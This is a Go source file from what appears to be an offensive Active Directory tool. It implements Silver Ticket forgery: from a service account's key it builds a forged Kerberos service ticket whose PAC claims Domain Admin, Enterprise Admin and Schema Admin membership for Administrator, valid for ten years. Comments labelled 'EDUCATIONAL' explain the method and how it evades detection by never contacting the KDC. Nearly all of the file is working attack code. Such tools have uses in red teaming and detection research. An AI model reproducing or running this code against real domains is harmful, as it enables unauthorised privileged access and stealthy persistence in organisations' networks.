package forge

import (
	"encoding/asn1"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/pac"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Silver Ticket Attack
//
// A Silver Ticket is a forged SERVICE ticket (not TGT).
// Unlike Golden Tickets, Silver Tickets are for specific services.
//
// Advantages over Golden:
//   - Only need the SERVICE account's hash (not krbtgt)
//   - Never contact the KDC (no network traffic to detect)
//   - Even works if the DC is unreachable!
//
// Disadvantages:
//   - Only works for that one service
//   - Can't request other tickets (it's not a TGT)
//
// Common Silver Ticket targets:
//   - CIFS (SMB access to file shares)
//   - HOST (general machine access)
//   - HTTP (WinRM, ADWS)
//   - LDAP (LDAP queries)
//   - MSSQLSvc (SQL Server access)

// SilverTicketRequest configures a Silver Ticket request.
type SilverTicketRequest struct {
	// Target user to impersonate
	Username string
	UserID   uint32 // RID

	// Domain info
	Domain    string
	DomainSID string

	// Target service
	ServiceSPN string // e.g., "cifs/server.domain.com"

	// Group memberships
	Groups []uint32

	// The key: service account's key
	ServiceKey  []byte // NTLM hash or AES key
	ServiceKvno int32

	// Options
	EType     int32
	Duration  time.Duration
	StartTime time.Time
}

// SilverTicketResult contains the forged Silver Ticket.
type SilverTicketResult struct {
	Kirbi  *ticket.Kirbi
	Base64 string
}

// ForgeSilverTicket creates a Silver Ticket.
//
// EDUCATIONAL: Silver Ticket Forge Process
//
// Almost identical to Golden Ticket, but:
// 1. SName is the target service SPN (not krbtgt)
// 2. Encrypted with service's key (not krbtgt's key)
// 3. Can be used directly with the service (bypass KDC)
//
// The PAC is still forged with our desired groups.
// Service trusts the PAC because it can decrypt the ticket.
func ForgeSilverTicket(req *SilverTicketRequest) (*SilverTicketResult, error) {
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if req.DomainSID == "" {
		return nil, fmt.Errorf("domain SID is required")
	}
	if len(req.ServiceKey) == 0 {
		return nil, fmt.Errorf("service key is required")
	}
	if req.ServiceSPN == "" {
		return nil, fmt.Errorf("service SPN is required")
	}

	// Defaults
	if req.Username == "" {
		req.Username = "Administrator"
	}
	if req.UserID == 0 {
		req.UserID = 500
	}
	if len(req.Groups) == 0 {
		req.Groups = []uint32{513, 512, 520, 518, 519} // DU, DA, GPO, SchemA, EA
	}
	if req.Duration == 0 {
		req.Duration = 10 * 365 * 24 * time.Hour
	}
	if req.StartTime.IsZero() {
		req.StartTime = time.Now().UTC()
	}
	if req.EType == 0 {
		req.EType = detectEtypeFromKey(req.ServiceKey)
	}

	// Generate session key
	sessionKey := generateSessionKey(req.EType)

	// Parse service name
	sname := parseServiceName(req.ServiceSPN)

	// Build PAC
	domainSID, err := pac.ParseSID(req.DomainSID)
	if err != nil {
		return nil, fmt.Errorf("invalid domain SID: %w", err)
	}

	pacData, err := buildSilverPAC(req, domainSID, req.ServiceKey, req.EType)
	if err != nil {
		return nil, fmt.Errorf("failed to build PAC: %w", err)
	}

	// Build EncTicketPart
	encTicketPart := buildSilverEncTicketPart(req, sessionKey, pacData, sname)

	// Encrypt ticket part with SERVICE key
	encTicketPartBytes, err := asn1.MarshalWithParams(encTicketPart, "application,tag:3")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal enc-ticket-part: %w", err)
	}

	encryptedTicket, err := encryptWithKey(encTicketPartBytes, req.ServiceKey, req.EType, 2)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt ticket: %w", err)
	}

	// Build Ticket for the service
	tkt := &asn1krb5.Ticket{
		TktVno: 5,
		Realm:  req.Domain,
		SName:  sname,
		EncPart: asn1krb5.EncryptedData{
			EType:  req.EType,
			Kvno:   req.ServiceKvno,
			Cipher: encryptedTicket,
		},
	}

	// Build credential info
	credInfo := &asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				Key: asn1krb5.EncryptionKey{
					KeyType:  req.EType,
					KeyValue: sessionKey,
				},
				PRealm: req.Domain,
				PName: asn1krb5.PrincipalName{
					NameType:   asn1krb5.NTPrincipal,
					NameString: []string{req.Username},
				},
				Flags:     flagsToBitString(),
				AuthTime:  req.StartTime,
				StartTime: req.StartTime,
				EndTime:   req.StartTime.Add(req.Duration),
				RenewTill: req.StartTime.Add(req.Duration),
				SRealm:    req.Domain,
				SName:     sname,
			},
		},
	}

	credInfoBytes, _ := asn1.MarshalWithParams(credInfo, "application,tag:29")

	krbCred := &asn1krb5.KRBCred{
		PVNO:    5,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{*tkt},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: credInfoBytes,
		},
	}

	kirbi := &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: credInfo,
	}

	b64, _ := kirbi.ToBase64()

	return &SilverTicketResult{
		Kirbi:  kirbi,
		Base64: b64,
	}, nil
}

// parseServiceName parses an SPN into a PrincipalName.
func parseServiceName(spn string) asn1krb5.PrincipalName {
	result := []string{}
	current := ""
	for _, c := range spn {
		if c == '/' && len(result) == 0 {
			result = append(result, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		result = append(result, current)
	}

	return asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTSrvInst,
		NameString: result,
	}
}

// buildSilverPAC builds PAC for Silver Ticket.
func buildSilverPAC(req *SilverTicketRequest, domainSID *pac.SID, serviceKey []byte, etype int32) ([]byte, error) {
	// Similar to Golden PAC but signed with service key
	logonInfo := &pac.LogonInfo{
		LogonTime:          timeToFileTime(req.StartTime),
		EffectiveName:      req.Username,
		FullName:           req.Username,
		UserID:             req.UserID,
		PrimaryGroupID:     513,
		GroupCount:         uint32(len(req.Groups)),
		UserFlags:          0x20,
		LogonDomainName:    req.Domain,
		LogonDomainID:      *domainSID,
		UserAccountControl: 0x200,
	}

	for _, gid := range req.Groups {
		logonInfo.GroupIDs = append(logonInfo.GroupIDs, pac.GroupMembership{
			RelativeID: gid,
			Attributes: 7,
		})
	}

	// NDR encode and build PAC
	logonInfoBytes := ndrEncodeLogonInfo(logonInfo)
	clientInfoBytes := ndrEncodeClientInfo(&pac.ClientInfo{
		ClientID:   timeToFileTime(req.StartTime),
		NameLength: uint16(len(req.Username) * 2),
		Name:       req.Username,
	})

	serverChecksum := &pac.Checksum{
		Type:      checksumTypeForEtype(etype),
		Signature: make([]byte, checksumSizeForEtype(etype)),
	}
	kdcChecksum := &pac.Checksum{
		Type:      checksumTypeForEtype(etype),
		Signature: make([]byte, checksumSizeForEtype(etype)),
	}

	pacData := buildPACData(logonInfoBytes, clientInfoBytes, serverChecksum, kdcChecksum)

	// For Silver Tickets, we sign with service key (we don't have krbtgt)
	// The KDC checksum is empty/invalid, but services don't validate it!
	signedPAC, err := signPAC(pacData, serviceKey, etype)
	if err != nil {
		return nil, err
	}

	return signedPAC, nil
}

// buildSilverEncTicketPart builds encrypted ticket part for Silver Ticket.
func buildSilverEncTicketPart(req *SilverTicketRequest, sessionKey, pacData []byte, sname asn1krb5.PrincipalName) *asn1krb5.EncTicketPart {
	endTime := req.StartTime.Add(req.Duration)

	authData := asn1krb5.AuthorizationData{
		{
			ADType: 1,
			ADData: mustMarshalAuthData([]asn1krb5.AuthorizationDataEntry{
				{ADType: 128, ADData: pacData},
			}),
		},
	}

	flags := asn1krb5.FlagForwardable | asn1krb5.FlagProxiable | asn1krb5.FlagRenewable |
		asn1krb5.FlagPreAuthent

	flagBytes := make([]byte, 4)
	flagBytes[0] = byte((flags >> 24) & 0xFF)
	flagBytes[1] = byte((flags >> 16) & 0xFF)
	flagBytes[2] = byte((flags >> 8) & 0xFF)
	flagBytes[3] = byte(flags & 0xFF)

	return &asn1krb5.EncTicketPart{
		Flags: asn1.BitString{
			Bytes:     flagBytes,
			BitLength: 32,
		},
		Key: asn1krb5.EncryptionKey{
			KeyType:  req.EType,
			KeyValue: sessionKey,
		},
		CRealm: req.Domain,
		CName: asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
			NameString: []string{req.Username},
		},
		Transited: asn1krb5.TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:          req.StartTime,
		StartTime:         req.StartTime,
		EndTime:           endTime,
		RenewTill:         endTime,
		AuthorizationData: authData,
	}
}
